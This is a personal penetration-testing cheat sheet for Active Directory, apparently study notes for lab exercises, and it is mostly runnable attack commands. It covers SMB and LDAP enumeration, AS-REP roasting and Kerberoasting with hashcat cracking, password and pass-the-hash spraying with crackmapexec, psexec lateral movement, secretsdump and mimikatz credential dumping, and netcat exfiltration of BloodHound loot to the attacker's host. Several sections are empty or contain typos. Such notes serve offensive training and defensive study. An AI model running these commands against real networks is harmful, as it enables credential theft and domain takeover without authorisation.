## Getting Initial Foodhold
1. Determine the IP address or hostname of the Active Directory server. If we seen( port 53 445, 389, 88, we are most likely dealing with Domain Controller)
2. Enumerate DNS
3. Check open ports: Enumerate SMB: If port 445 is open, use tools like enum4linux, smbmap, smbclient crackmapexec to gather information about the SMB service, such as shared folders and users.
4. Enumerate LDAP: If port 389 or 3268/3269 is open, use tools like ldapsearch, to gather information about the LDAP directory service, such as users, groups, and organizational units.
5. Enumerate Kerberos: If port 88 is open, use tools like krb5-enum-users or enum-users-gpp-decrypt to enumerate users and potentially crack Kerberos passwords.
6. Enumerate RPC: If port 135 is open, use tools like rpcclient or nmap-rpc-info to gather information about the RPC service and potentially identify vulnerable endpoints.
7. Check for group policy: (Groups.xml for Windows 12 and below) Look for group policy information in the directory, use tools like gpp-decrypt to decrypt and extract any saved credentials.
   - open the Groups.xml file. decrpyt the password hash by `gpp-decrypt $HASH`
9. Check for computer accounts: Look for computer accounts in the directory, which can be used to identify and target specific systems on the network.
10. Look for organizational units (OUs): Check for OUs in the directory, which can be used to identify the structure and organization of the network.
11. https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg  Look at this roadmap
12. https://dw3113r.com/2022/07/20/active-directory-attack-cheat-sheet/ 

## Enumeration
1. `nmap -sC -sV -p- -oA result 10.0.0.0./8`
2. Edit host file `subl /etc/hosts to add domain`

## Port 53 DNS
1. `nslookup` 
2. `server $IP` then type -> `$IP` to figure out the host name. 
3. `dnsrecon -d $IP -r $IP
4. 
## Port 445 SMB (Check SMB.md file)
1. `nmap --script safe -p 445, $IP`
2. `enum4linux $IP`
3. `smbclient --no-pass -L //<IP>` , `smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP>` , `smbclient --no-pass //<IP>/<Folder>`
4. `smbmap -H $IP` (anonymous login) 
5. `smbmap -R $Filename $IP` (list the content of the directroy)
6. `smbmap -R Filename $IP -A $FiletoDownload -q` (Download the intersting file such as Groups.xml)  `update db` and `locate $Filename`. 
7. `crackmapexec smb $IP -u '' -p '' ` or `crackmapexec smb $IP -u 'guest' -p ''` to try to access.
## Port 389, 636, 3268, 3269 LDAP 
1. `nmap -n -sV --script "ldap* and not brute" -Pn -p389  192.168.55.122`
2. `nmap -n -sV --script "ldap* and not brute" -Pn  192.168.55.122`
3.  `ldapsearch -x -b <search_base> -H <ldap_host>` 
4.  `ldapsearch -x -b "dc=hutch,dc=offsec" -H ldap://192.168.55.122`    anonymous authentication
5.  `ldapsearch -x -H ldap://192.168.55.122 -D '' -w '' -b "DC=hutch,DC=offsec"`   anonymous authentication
6.  `ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"` credential login
7.  `ldapsearch -x -H ldap://192.168.55.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep sAMAccountName:`   Grabbing User
8.  `ldapsearch -x -H ldap://192.168.55.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep description:`   Grabbing User


## AS-REP Roasting (Authentication Reply Roasting) (With valid users)
1. If pre-authentication is disabled, and we provide a list of userlists to the domain controller (AS-REQ), the DC will grant us TGT. If the passwords are weak, we can crack the TGT and gain access. We can use krebrute, impacket, or crackmap
2. If we dont find some misconfiguration or user name try using this username list `/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt` 
3. or `https://github.com/jeanphorn/wordlist/blob/master/usernames.txt` for the below command
4. `kerbrute userenum --dc $IP -d DOMAIN.NAME user.txt` user.txt is a userlist that we have created to authenticate to DC.
5. `impacket-GetNPUsers -usersfile user.txt -dc-ip $IP DOMAIN.NAME/`
6. Crack the hash
## Web vulnerabiltities   
   
# After initial shell, credentials or some password (Enumeration)
0. ***Logistic***: Say we gain some creds from the above method and have a shell on the computer. Now what can we do?
1. Check if, I can logon to other PC with same credentials(Pass the Pass crackmapexec) Dump the SAM file to figure out other accounts to move to other account,( Pass the Hash, secret.py)
2. Enumerate the PC that we are loged on to. Continue this process for lateral movement!(psexec)
3. Things we want to know, domain admins, domain controller, domain policy
4. Enumerate the initial target using powerview. Trasfer Powerview , and gather info to send back to bloodhound
```
Transfer SharHound (exe or ps1) and nc.exe to target
Run SharpHound.exe or .ps1
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain <DOMAIN.LOCAL> -ZipFileNmame loot.zip
Transfer loot back to kali:
- On $LHOST: nc -nlvp 4321 > loot.zip
- On target: nc.exe -nv <kali IP> 4321 < loot.zip
- Drag loot.zip into BloodHound GUI
```
4. https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993 (Some powerView Command cheatsheeet or refer below)
5. `powershell -ep bypass ` `. .\PowerView.ps1` 
6. `Get-NetDomain` , (domain info)
7.  For manual inspection `net user` (for local accounts) `net user /domain` (for all domain users) `net user <USERNAME> /domain` 
8. `Get-NetUser` `Get-NetUser | select cn` 
9. `Get-UserProperty -Properties pwdlastset` (are the passwords new?)   `Get-UserProperty -Properties logoncount` (logins with lot of login?)  
10. `Get-NetGroup`  `Get-NetGroup -GroupName "Domain Admins`. To view the Members `Get-NetGroupMembers -GroupName "Domain Admins`
11. `Get-NetDomainController` (for DC info, DC IP)
12. `Get-DomainPolicy` `(Get-DomainPolicy)."system access"` (policy such as minimum password length)
13. `Get-NetComputer` (show all the computers in the Domain) 
14. `Invoke-ShareFinder` (what files are being shared)
15. `Get-NetGPO` (show group policy)
16.  `Get-NetLoggedon -ComputerName <current Computer name>  `(Find,Currently Logged on Users: their credentials will be saved in memory so find out logged in highvalue target or lateral movement)
17.   `Get-NetSession -ComputerName dc01` (to verfify that domain controller is logged into what other pc)
18.   
## Pass the Password Attack (Come back to this step for lateral movement) 
1. Lets say we have some credentials. Lets try to pass the password/hash to other connected networks. Would be great if we could get to DC straight away but usually, we wont. 
2. `crackmapexec smb 192.168.119.0/24 -u SOMEUSERNAME -d DOMAIN.LOCAL -p SOMEPASSWORD` 
3. `crackmapexec smb $IP -u ./users.txt -p ./passwords.txt --continue-on-success` check if other users use the same password
4. `psexec DOMAIN/username:SOMEPASSWORD@TARGETIP ` to login if sucessful
5. E.G `python /usr/share/doc/python3-impacket/examples/psexec.py  offsec/Allison:'RockYou!'@192.168.125.59`
## Pass the Hash or crack(gained from local SAM)
1. `impacket-secretsdump <username>:<password>@<domain name or IP> -dc-ip <DC IP>`
2. or `secretsdump.py marvel/ID:SOMEPASSWORD@TARGETIP` eg `python /opt/impacket/examples/secretsdump.py offsec/Allison:'RockYou!'@192.168.125.59 `
3. `crackmapexec smb 192.168.57.0/24 -u "Frank Admin" -H <Second part of the HASH without ::> --local-auth` (we are trying to login to other computers)
4. If we pawned a PC, we can try to psexec into the PC. `psexec.py "Frank Admin":@TARGETIP -hashes avbcd:abcd`. 
5. e.g `python /usr/share/doc/python3-impacket/examples/psexec.py  offsec/Administrator:@192.168.176.57 -hashes 51404eeaad3b435b51404ee:8c802621d74345dded890f3e5`
6. If dont get a shell, we werent able to gain admin access. Maybe RDP is open?. We can still do Kerbroasting.
## Dumping Hash (as Admin) 
1. Use mimikatz to view, steal credentials, generate kerbros tickets and leverage attack.
2. `.\mimikatz.exe`
3. `privilege::debug` (to gain access and bypass protection against memory) 
4. `sekurlsa::logonpasswords` Not only are we compromising DC, when we comporised a regualr computer, it is going to show the PC and NTLM hash, and any other user that has logged into the computer ever since the last reboot which is stored in memory
5. `lsadump::sam`
6. `lsadump::lsa /patch`

## Golden Ticket Attack


## GPP credentials 


## Token Impersonation
0. If we navigate to a machine and token of a domain administrator(user), we have domain admin. 


## Kerbreroasting (Service Account Attack (want to attack members of high value group, dont have to be admin )
1. Once we have some username + password, we ask the Domian Controller for TGS (since we can request TGT) and try to crack TGS hash.
2. `locate  GetUserSPNs.py`  `cd /usr/share/doc/python3-impacket/examples/` `python GetUserSPNs.py offsec.local/nathan:"abc123" -dc-ip=192.168.125.57 -request`

```
impacket-GetUserSPNs <IP or hostname>/<username>:<password> -request [add -request if SPN is found]
[save hash and crack with hashcat]
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

## Dump the hash 
1. We have a user account and pssexed into an account. We want to dump hashes.
2. `secretsdump.py Domain/USERNAME:SOMEPASSWORD@TargetIP`
3. `crackmapexec smb $IP.0/24 -u "UserNmae" -H <Hash> --local-auth
## Token Impersonation
